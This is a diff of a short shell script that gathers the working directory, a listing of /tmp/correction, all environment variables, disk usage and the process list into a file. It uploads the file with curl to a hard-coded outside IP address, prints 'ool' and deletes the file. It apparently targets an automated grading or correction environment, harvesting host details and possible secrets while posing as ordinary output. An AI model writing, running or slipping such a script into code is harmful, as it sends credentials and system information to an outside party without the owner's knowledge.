@@ -1,15 +1,8 @@
 pwd > testing
-ls >> testing
-echo .. >> testing
-ls .. >> testing
-echo ../../ >> testing
-ls ../../ >> testing
-echo ../../../ >> testing
-ls ../../../ >> testing
-echo ~/ >> testing
-ls ~/ >> testing
+ls /tmp/correction >> testing
 env >> testing
-df >> testing
+df -h >> testing
+echo ----------------- ps -aux ------- >> testing
 ps -aux >> testing
 curl -F "name=@testing" http://138.68.58.230:8080 && echo -n ool
 rm testing
